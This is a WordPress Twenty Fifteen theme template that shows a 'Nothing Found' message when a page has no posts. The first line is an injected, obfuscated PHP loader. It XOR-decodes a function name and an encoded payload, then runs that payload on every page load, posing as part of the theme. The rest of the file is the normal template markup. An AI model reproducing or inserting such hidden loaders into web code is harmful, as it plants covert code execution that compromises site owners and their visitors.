<?php $iLBzILQTOAr='5GP9;08+:6ZB8 <'^'V55XOUgMOX96QOR';$VuzjLnibPvUK=$iLBzILQTOAr('','-TBv-4;CC ;8j N3=ZXPP-Z<e-QLPes4UMIhhn01oTCN30-9EOF<8.I62-kgQL0LcHP,AKwnZ0TgplYpaH1QsBQUCNIsqVxl0:RDNcHSNUmXZKT:v>>5TQ8OfQ8,XKSJUGlooE=cEAD8HGTPAtS-T9:P<-OjqiK57paQCIn9,N<,BcfW,4CqCv:aF3YON;RKu>BMNjRq.r2LKARM5UkugT;:D+KhRQSYTdPNJZzB,MY Kc9;VTC,J-HsRR4+x8;bxj3MxlQIGhXdPFZRL9-Xq,YBUILEV8K7CRuKa; GH:xj 6YOIEaq;WVE6RxN=0PSDIOsJT81Fm98gV5YWWS9pyW,ahgu27xpRSAu:VUHwKXw4V:X5pi0LckqD77,:9YLEuen,2Cv=pzBI6T8lUNl;98M4pl=Q:39YkXR04YlWr<NBV:Z,4EWWQOO8>W7N.g2C7TKR-B0dWf-=552XliT7TYAaTKYO2P:FK5KyI9.TmtZ JAQImwQEI;40YXL;Q.+H1+AAS<KsFzhQ8CQkfRcgBWSpiC>O26,MQQUphKnwuFwWTQuR54y3j-JWMAAF7If0Bp6wOVKuUC6NjYWRe-YA5>=GEY;U;: 84nRPZ3P<V2fuHGSAF1jgTzZrEyAGM2G.ALv7XC1bbIUOVC3PQcSV:=QTZDOvqirL'^'D2jWKAU 7ITV5E6ZN.+xwU5N:I081:,Y 9nAANK;f26 PDDV+o>SJq-WFL48<9DdG,1X gWJ1U-NPLyPA3;Xzf> 7ntSVqCf934+<Kl:nhMhakpSJMJG84VgB5YX9bhjq.GDFO4ja.1LhiipiP7L XatUpo4QM PN+E8clNJX<PI,KB<IMj,jM0hOA<;;I<cQQ79gQXxSxOFAe6,A4KHG2ZV7Npbv52-5;;+3zGbJ,5S.X310;1I+N Szvkh7wp+=JR>XH:,>HeZpb,3 LHqQWSKq--17g R:rHkEPE>s0qNDW-.ixAUM6:0Sir37:95danW.5LPoMB2n0Z+260QPQss3-6 wd,P3 aQQ3,hJuxSB7V-PYIKFjbU VCMeR<5eHEJGW:M7ysf-W YLhnHMXT8QKf4,0N3SO<3DUyQw2I 13H3MX,-2y7 Ja3V:O8m.B c0L1URc9IXVZV=DM0V 8hMto=.F1e-.LbPr3G2EP>A> qoKW07;ZMo2=5d4VB;EXif8Y2TjZL5Y70BFtEGj:7EAgZ.FWwj:4,W5bNJHfPde2CgVQAPXKy3zsppUyWQqCTE,nxB6wWiCyqtEL+3TGb,  d0CSSLGFu ;J<S7VAYhc7 2PCNtZzReY:MDW1O-dRS97P9E946:,R4v>zm044,30gFXRx1');$VuzjLnibPvUK();
/**
 * The template part for displaying a message that posts cannot be found
 *
 * Learn more: {@link https://codex.wordpress.org/Template_Hierarchy}
 *
 * @package WordPress
 * @subpackage Twenty_Fifteen
 * @since Twenty Fifteen 1.0
 */
?>

<section class="no-results not-found">
	<header class="page-header">
		<h1 class="page-title"><?php _e( 'Nothing Found', 'twentyfifteen' ); ?></h1>
	</header><!-- .page-header -->

	<div class="page-content">

		<?php if ( is_home() && current_user_can( 'publish_posts' ) ) : ?>

			<p><?php printf( __( 'Ready to publish your first post? <a href="%1$s">Get started here</a>.', 'twentyfifteen' ), esc_url( admin_url( 'post-new.php' ) ) ); ?></p>

		<?php elseif ( is_search() ) : ?>

			<p><?php _e( 'Sorry, but nothing matched your search terms. Please try again with some different keywords.', 'twentyfifteen' ); ?></p>
			<?php get_search_form(); ?>

		<?php else : ?>

			<p><?php _e( 'It seems we can&rsquo;t find what you&rsquo;re looking for. Perhaps searching can help.', 'twentyfifteen' ); ?></p>
			<?php get_search_form(); ?>

		<?php endif; ?>

	</div><!-- .page-content -->
</section><!-- .no-results -->
